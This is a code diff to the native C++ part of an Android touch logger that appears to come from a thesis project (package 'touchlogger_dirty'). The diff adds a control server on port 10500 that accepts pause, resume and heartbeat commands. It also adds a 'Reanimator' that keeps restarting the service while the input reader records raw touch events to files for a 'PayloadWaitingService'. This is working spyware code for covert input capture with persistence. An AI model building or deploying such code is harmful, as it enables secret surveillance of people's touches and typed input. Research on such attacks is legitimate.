@@ -10,11 +10,12 @@
 #include <stdlib.h>
 #include <fcntl.h>
 #include <sys/wait.h>
-#include <stdbool.h>
 #include <sys/stat.h>
 #include <utils/Utils.h>
 #include "dirty/common/logging.h"
 #include "input_device/InputReader.h"
+#include "ControlReader.h"
+#include "utils/Reanimator.h"
 
 typedef int getcon_t(char** con);
 
@@ -25,6 +26,16 @@ typedef int getcon_t(char** con);
 #define SERVICE_PROCESS_NAME    "touchlogger.here"
 #define SERVICE                 ".service.PayloadWaitingService"
 #define ACTION                  "org.leyfer.thesis.touchlogger_dirty.service.action.WAIT_FOR_PAYLOAD"
+#define CONTROL_PORT            10500
+#define HEARTBEAT_INTERVAL_MS   100 * 1000  // 100 ms
+
+static const std::string heartbeatCommand = "heartbeat\n";
+static const std::string pauseCommand = "pause\n";
+static const std::string resumeCommand = "resume\n";
+
+InputReader* inputReader;
+
+Reanimator* reanimator;
 
 int isServiceProcessActive()
 {
@@ -198,6 +209,48 @@ int startServceAndWaitForItToBecomeOnline()
   }
 }
 
+int onPause()
+{
+  if (inputReader != nullptr)
+  {
+    inputReader->pause();
+    return 0;
+  }
+  else
+  {
+    LOGV("Unable to pause input reader as it is not available!");
+    return -1;
+  }
+}
+
+int onResume()
+{
+  if (inputReader != nullptr)
+  {
+    inputReader->resume();
+    return 0;
+  }
+  else
+  {
+    LOGV("Unable to resume input reader as it is not available!");
+    return -1;
+  }
+}
+
+int onHeartBeat()
+{
+  if (reanimator != nullptr)
+  {
+    reanimator->onHeartBeat();
+    return 0;
+  }
+  else
+  {
+    LOGV("Unable to send heartbeat event to reanimator as it is not available!");
+    return -1;
+  }
+}
+
 int main(int argc, const char** argv)
 {
   LOGV("Uid: %d", getuid());
@@ -237,12 +290,30 @@ int main(int argc, const char** argv)
     return -1;
   }
 
+  LOGV("Starting reanimator...");
+  reanimator = new Reanimator(HEARTBEAT_INTERVAL_MS, startServceAndWaitForItToBecomeOnline);
+
+  LOGV("Starting control server thread...");
+  std::map<std::string, control_callback> callbackMap;
+  callbackMap.emplace(pauseCommand, &onPause);
+  callbackMap.emplace(resumeCommand, &onResume);
+  callbackMap.emplace(heartbeatCommand, &onHeartBeat);
+  ControlReader* controlReader = new ControlReader(CONTROL_PORT, callbackMap);
+  controlReader->start();
+
   LOGV("Collecting input data & sending it to Android service...");
   EventFileWriter* eventFileWriter = new EventFileWriter(EVENT_DATA_DIR);
-  InputReader* inputReader = new InputReader(eventFileWriter, inputDevice);
+  inputReader = new InputReader(eventFileWriter, inputDevice);
   inputReader->start();
 
   LOGV("Finish inputReader...");
   delete (inputReader);
+
+  LOGV("Stopping control server...");
+  controlReader->stop();
+
+  LOGV("Stopping service reanimator...");
+  reanimator->stop();
+
   return 0;
 }
